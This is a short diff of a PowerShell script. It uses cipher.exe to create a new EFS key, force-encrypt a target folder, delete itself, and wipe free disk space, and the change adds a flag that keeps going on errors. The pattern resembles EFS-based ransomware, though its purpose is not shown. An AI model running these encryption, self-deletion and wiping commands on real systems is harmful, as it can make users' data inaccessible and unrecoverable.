@@ -71,12 +71,12 @@ cipher.exe /k
 Write-Host "Updating Target Folder with New EFS Key" -ForegroundColor Yellow -BackgroundColor Black
 cipher.exe /u $path 
 Write-Host "Forcing Encryption of $path with new key" -ForegroundColor Red -BackgroundColor Black
-cipher.exe /e /f /a $path
+cipher.exe /i /e /f /a $path
 
 #Self-Destruct Script Function After Completion
 #Ref: https://www.safaribooksonline.com/library/view/windows-powershell-cookbook/9780596528492/ch14s05.html
 Remove-Item $MyInvocation.InvocationName -ErrorAction SilentlyContinue
-cipher.exe /w $path
+cipher.exe /i /w $path
 
 #exit
  Exit
